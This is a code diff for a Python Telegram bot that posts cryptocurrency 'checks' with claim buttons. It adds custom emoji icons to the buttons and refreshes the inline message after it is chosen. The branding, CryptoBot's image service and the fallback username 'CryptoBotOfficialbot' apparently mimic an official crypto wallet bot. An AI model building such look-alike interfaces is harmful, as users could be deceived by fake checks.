@@ -444,10 +444,18 @@ async def inline_query_handler(query: InlineQuery):
             img_url = f'https://imggen.cr.bot/checks/image?asset={asset}&asset_amount={amount_val:g}&fiat=USD&fiat_amount={fiat_val:.2f}&main=asset&v5'
 
             kb_ru = InlineKeyboardMarkup(inline_keyboard=[[
-                InlineKeyboardButton(text=f'Забрать {amount_val:g} {asset}', url=deep_link)
+                InlineKeyboardButton(
+                    text=f'Забрать {amount_val:g} {asset}',
+                    url=deep_link,
+                    icon_custom_emoji_id="5311998535032409760"
+                )
             ]])
             kb_en = InlineKeyboardMarkup(inline_keyboard=[[
-                InlineKeyboardButton(text=f'Claim {amount_val:g} {asset}', url=deep_link)
+                InlineKeyboardButton(
+                    text=f'Claim {amount_val:g} {asset}',
+                    url=deep_link,
+                    icon_custom_emoji_id="5311998535032409760"
+                )
             ]])
 
             check_icon = '<tg-emoji emoji-id="5311998535032409760">🧾</tg-emoji>'
@@ -531,7 +539,11 @@ async def inline_query_handler(query: InlineQuery):
             icon_coin_url = f'https://flows3039-png.github.io/cryptobot-tg/images/coins/{a}.webp'
 
             kb = InlineKeyboardMarkup(inline_keyboard=[[
-                InlineKeyboardButton(text=f'Забрать {amt_display:g} {a}', url=deep_link)
+                InlineKeyboardButton(
+                    text=f'Забрать {amt_display:g} {a}',
+                    url=deep_link,
+                    icon_custom_emoji_id="5311998535032409760"
+                )
             ]])
             check_icon = '<tg-emoji emoji-id="5311998535032409760">🧾</tg-emoji>'
             coin_emoji_id = config.CURRENCIES.get(a, {}).get("emoji_id")
@@ -586,6 +598,54 @@ async def chosen_inline_result_handler(chosen: ChosenInlineResult):
                 log.info('Created inline check %s for user %d: %s %s (inline_msg=%s)', cid, uid, amount, asset, chosen.inline_message_id)
             except Exception as e:
                 log.error('Failed to create inline check %s: %s', cid, e)
+
+            if chosen.inline_message_id:
+                try:
+                    price_usd = ASSET_PRICES.get(asset, 1.0)
+                    fiat_val = amount * price_usd
+                    check_icon = '<tg-emoji emoji-id="5311998535032409760">🧾</tg-emoji>'
+                    coin_emoji_id = config.CURRENCIES.get(asset, {}).get("emoji_id")
+                    if asset == "USDT":
+                        coin_icon = '<tg-emoji emoji-id="6035288280562404083">🪙</tg-emoji>'
+                    elif coin_emoji_id:
+                        coin_icon = f'<tg-emoji emoji-id="{coin_emoji_id}">🪙</tg-emoji>'
+                    else:
+                        coin_icon = ""
+                    coin_part = f"{coin_icon} " if coin_icon else ""
+
+                    is_en = 'chk_en_' in res_id
+                    if is_en:
+                        text_msg = f"{check_icon} Check for {coin_part}{amount:g} {asset} (${fiat_val:.2f})."
+                        btn_text = f"Claim {amount:g} {asset}"
+                    else:
+                        text_msg = f"{check_icon} Чек на {coin_part}{amount:g} {asset} (${fiat_val:.2f})."
+                        btn_text = f"Забрать {amount:g} {asset}"
+
+                    bot_info = await chosen.bot.get_me()
+                    b_user = bot_info.username or config.BOT_USERNAME or "CryptoBotOfficialbot"
+                    deep_link = f"https://t.me/{b_user}?start=check_{cid}"
+                    kb = InlineKeyboardMarkup(inline_keyboard=[[
+                        InlineKeyboardButton(
+                            text=btn_text,
+                            url=deep_link,
+                            icon_custom_emoji_id="5311998535032409760"
+                        )
+                    ]])
+                    img_url = f'https://imggen.cr.bot/checks/image?asset={asset}&asset_amount={amount:g}&fiat=USD&fiat_amount={fiat_val:.2f}&main=asset&v5'
+
+                    await chosen.bot.edit_message_text(
+                        inline_message_id=chosen.inline_message_id,
+                        text=text_msg,
+                        parse_mode="HTML",
+                        reply_markup=kb,
+                        link_preview_options=LinkPreviewOptions(
+                            url=img_url,
+                            prefer_large_media=True,
+                            show_above_text=True
+                        )
+                    )
+                except Exception as ex_edit:
+                    log.warning("Could not refresh inline check custom emojis: %s", ex_edit)
 
 @dp.message(Command("testreg"))
 async def cmd_testreg(msg: Message, state: FSMContext):
